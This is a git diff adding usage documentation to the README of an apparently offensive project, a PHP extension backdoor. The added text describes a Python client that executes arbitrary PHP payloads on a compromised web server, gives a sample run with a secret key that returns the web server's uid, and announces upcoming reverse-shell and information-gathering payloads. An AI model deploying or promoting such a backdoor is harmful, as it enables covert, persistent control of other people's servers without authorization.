@@ -30,8 +30,22 @@ And next, we compile. For windows, I link to the articles (original in Russian, 
 `phpize && ./configure && make`
 
 # Use Instructions
+In client/ I provide an example Python client which allows executing any arbritary PHP payload on the webserver. I also provide some example payloads in client/payloads/ that you may find useful. 
 
+To use the client, you simply do the following.
+```
+root@unsanitized:~/dev/php-extension-backdoor/client# ./php_module_client.py http://192.168.1.7 secret_squirrels payloads/getuid.php
+Starting execution...
+uid: 33
+Done!
+root@unsanitized:~/dev/php-extension-backdoor/client#
+```
 
+Planned payloads include a variety of information gathering payloads, some reverse shells, and other useful utilities that I come up with. I will release those as they prove to be stable/useable soon.
+
+# Credits
+Original Russian author, and [akamajoris][akamajoris]. All I did was some translation and writing payloads and client because I found them useful. 
 
 [russian]: http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/
 [english]: http://example.com/
+[akajamoris]: https://github.com/akamajoris
